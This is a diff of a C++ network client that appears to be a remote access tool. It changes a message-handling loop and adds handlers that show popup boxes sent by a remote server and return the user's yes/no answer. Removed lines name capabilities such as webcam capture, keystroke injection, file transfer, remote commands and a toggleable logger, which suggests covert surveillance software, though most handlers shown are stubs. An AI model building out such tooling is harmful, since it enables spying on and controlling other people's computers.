@@ -67,21 +67,9 @@ void rcv(NetworkHandlerServer NH) {
     cv::Mat image;
     INPUT in;
 
-    NH.AddDataType("DesktopIMG", 2);
-    NH.AddDataType("MousePos", 3);
-    NH.AddDataType("MouseDown", 4);
-    NH.AddDataType("MouseUp", 4);
-    NH.AddDataType("KeyDown", 5);
-    NH.AddDataType("KeyUp", 6);
-    NH.AddDataType("CamIMG", 7);
-    NH.AddDataType("SendFILE", 8);
-    NH.AddDataType("RecvFILE", 8);
-    NH.AddDataType("CMD", 9);
-    NH.AddDataType("EnableLogger", 10);
-    NH.AddDataType("DisableLogger", 11);
-    //NH.AddDataType("", 3);
 
-    NH.SendTypeList();
+
+    NH.RecvTypeList();
 
     while (true) {
         NH.RecvDataType(dt);
@@ -297,11 +285,37 @@ void rcv(NetworkHandlerServer NH) {
         }
         else if (dt.Name == "DesktopIMG")
         {
-           //send desktop image
+            //send desktop image
 
         }
         else if (dt.Name == "CamIMG") {
             //send cam image
+        }
+        else if (dt.Name == "RecvPopUp") {
+
+            string Title = NH.RecvDataT<string>();
+
+            string Msg = NH.RecvDataT<string>();
+
+            MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONEXCLAMATION);
+
+        }
+        else if (dt.Name == "RecvPopUpYN") {
+            string Title = NH.RecvDataT<string>();
+
+            string Msg = NH.RecvDataT<string>();
+
+            int awnser = MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONQUESTION | MB_YESNO);
+
+            switch (awnser)
+            {
+            case IDYES:
+                NH.SendDataT<int>(1);
+                break;
+            case IDNO:
+                NH.SendDataT<int>(0);
+                break;
+            }
         }
 
     }
@@ -315,13 +329,8 @@ int main()
 
 
     if (NH.DefaultInitConnect()) {
-        //recvThread = thread(rcv, NH);
-        while (true)
-        {
-
-            cout << NH.RecvDataT<string>() << endl;
-        }
-        system("pause");
+        recvThread = thread(rcv, NH);
+        //system("pause");
     }
 
     recvThread.join();
